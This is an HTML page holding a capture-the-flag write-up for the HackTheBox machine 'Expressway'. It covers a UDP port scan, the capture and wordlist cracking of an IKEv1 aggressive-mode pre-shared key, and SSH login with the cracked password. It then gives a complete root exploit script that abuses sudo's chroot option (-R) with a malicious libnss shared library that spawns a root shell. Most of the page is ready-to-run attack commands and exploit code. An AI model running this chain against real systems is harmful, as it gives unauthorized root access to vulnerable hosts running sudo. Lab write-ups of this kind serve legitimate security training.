<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Expressway</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-main: #0d1117;
            --card-bg: #161b22;
            --text-main: #c9d1d9;
            --text-muted: #8b949e;
            --accent: #39d353;
            --accent-hover: #2ea043;
            --heading: #00ff88;
            --border: #30363d;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'JetBrains Mono', 'Segoe UI', sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            line-height: 1.7;
            padding: 30px 15px;
            min-height: 100vh;
        }
        .container { max-width: 900px; margin: 0 auto; }
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        h1 {font-size: 2.6em; color: var(--heading); text-align: center; margin-bottom: 10px; font-weight: 600;}
        .subtitle {text-align: center; color: var(--text-muted); margin-bottom: 50px; font-size: 1.15em;}
        h2 {color: var(--heading); font-size: 1.8em; margin: 35px 0 18px 0; padding-bottom: 8px; border-bottom: 2px solid var(--accent); display: inline-block;}
        p, pre, ul {margin-bottom: 20px; font-size: 1.1em;}
        strong {color: #ffffff;}
        code {background: #21262d; padding: 2px 8px; border-radius: 6px;}
        pre {background: #21262d; padding: 16px; border-radius: 10px; overflow-x: auto; border: 1px solid var(--border);}
        table {border-collapse: collapse; width: 100%; margin: 20px 0;}
        th, td {border: 1px solid var(--border); padding: 10px; text-align: left;}
        th {background: #21262d;}
        a {color: var(--accent); text-decoration: none;}
        a:hover {color: var(--accent-hover); text-decoration: underline;}
        @media (max-width: 768px) {.card {padding: 25px;} h1 {font-size: 2.2em;}}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>Expressway</h1>
            <p class="subtitle">HackTheBox • IKEv1 PSK Cracking → sudo -R chroot PrivEsc</p>

            <h2>Initial Enumeration</h2>
            <pre>nmap -T5 -Pn -sU -sV 10.10.11.87</pre>
            <table>
                <tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr>
                <tr><td>500/udp</td><td>open</td><td>isakmp</td><td></td></tr>
            </table>

            <h2>Foothold – IKEv1 Aggressive Mode PSK Crack</h2>
            <pre>ike-scan -A expressway.htb
ike-scan -A --pskcrack=gg.txt expressway.htb
psk-crack -d /usr/share/wordlists/rockyou.txt gg.txt</pre>
            <p>Cracked PSK: <code>freakingrockstarontheroad</code></p>
            <pre>ssh ike@10.10.11.87
# password: freakingrockstarontheroad
cat user.txt</pre>

            <h2>Privilege Escalation – sudo -R + libnss Exploit</h2>
            <p>Upload and execute the following script as <code>test.sh</code>:</p>
            <pre>#!/bin/bash
set -e
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

cat > woot1337.c <<'EOF'
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot

rm -rf "$STAGE"</pre>
            <pre>chmod +x test.sh
./test.sh</pre>
            <p>→ Instant root shell → <code>cat /root/root.txt</code></p>

            <h2>Flags</h2>
            <p><strong>user.txt :</strong> ike<br>
            <strong>root.txt :</strong> root</p>

        </div>
    </div>
</body>
</html>